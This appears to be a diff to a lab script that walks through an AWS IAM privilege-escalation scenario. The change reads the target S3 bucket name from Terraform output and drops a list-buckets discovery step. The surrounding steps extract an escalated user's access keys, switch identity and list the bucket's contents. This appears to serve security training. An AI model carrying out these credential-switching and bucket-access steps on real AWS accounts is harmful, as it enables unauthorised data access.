@@ -61,6 +61,7 @@ fi
 # Extract credentials
 PRIVESC_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_user_access_key_id')
 PRIVESC_SECRET_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.privesc_user_secret_access_key')
+BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.target_bucket_name')
 
 if [ "$PRIVESC_ACCESS_KEY" == "null" ] || [ -z "$PRIVESC_ACCESS_KEY" ]; then
     echo -e "${RED}Error: Could not extract credentials from terraform output${NC}"
@@ -177,12 +178,10 @@ BUCKET_USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "New identity: $BUCKET_USER_IDENTITY"
 echo -e "${GREEN}✓ Switched to bucket access user credentials${NC}\n"
 
-# [EXPLOIT] Step 7: Discover target bucket
-echo -e "${YELLOW}Step 7: Discovering target bucket${NC}"
-show_cmd "Attacker" "aws s3api list-buckets --query 'Buckets[?starts_with(Name, pl-prod-iam-002-to-bucket-)].Name' --output text"
-BUCKET_NAME=$(aws s3api list-buckets --query "Buckets[?starts_with(Name, 'pl-prod-iam-002-to-bucket-')].Name" --output text)
+# [EXPLOIT] Step 7: Identify target bucket
+echo -e "${YELLOW}Step 7: Identifying target bucket${NC}"
 echo "Target bucket: $BUCKET_NAME"
-echo -e "${GREEN}✓ Found target bucket${NC}\n"
+echo -e "${GREEN}✓ Identified target bucket from scenario configuration${NC}\n"
 
 # [EXPLOIT] Step 8: List bucket contents
 echo -e "${YELLOW}Step 8: Listing bucket contents${NC}"
